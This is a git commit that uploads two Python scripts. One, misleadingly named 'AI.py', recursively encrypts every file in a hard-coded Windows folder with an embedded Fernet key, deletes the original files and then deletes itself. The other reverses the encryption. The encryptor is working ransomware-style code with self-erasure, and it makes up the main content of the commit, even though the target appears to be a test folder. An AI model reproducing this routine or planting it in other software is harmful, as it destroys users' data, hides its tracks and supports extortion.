289fa91e5096c6d8a46df4ee88c0eb193d002ce0
Danyal <130285571+Danyalss@users.noreply.github.com>
2023-08-31 00:02:15 +0330

    Add files via upload

---
+++ AI.py
@@ -0,0 +1,23 @@
+import os
+from cryptography.fernet import Fernet
+
+def encrypt_files(path, key):
+    f = Fernet(key)
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            file_path = os.path.join(root, file)
+            with open(file_path, 'rb') as f1:
+                data = f1.read()
+            encrypted_data = f.encrypt(data)
+            with open(file_path + '.enc', 'wb') as f2:
+                f2.write(encrypted_data)
+            os.remove(file_path)
+
+def delete_script():
+    os.remove(__file__)
+
+path = r'C:\share C\vscode\K\test'
+key = b'gQHAjOvQ8tUkqHqrfwXs8uVwdsgLmItRH4JZ2xz18l0='
+
+encrypt_files(path, key)
+delete_script()
---
+++ Al_d.py
@@ -0,0 +1,20 @@
+import os
+from cryptography.fernet import Fernet
+
+def decrypt_files(path, key):
+    f = Fernet(key)
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            if file.endswith('.enc'):
+                file_path = os.path.join(root, file)
+                with open(file_path, 'rb') as f1:
+                    data = f1.read()
+                decrypted_data = f.decrypt(data)
+                with open(file_path[:-4], 'wb') as f2:
+                    f2.write(decrypted_data)
+                os.remove(file_path)
+
+path = r'C:\share C\vscode\K\test'
+key = b'gQHAjOvQ8tUkqHqrfwXs8uVwdsgLmItRH4JZ2xz18l0='
+
+decrypt_files(path, key)
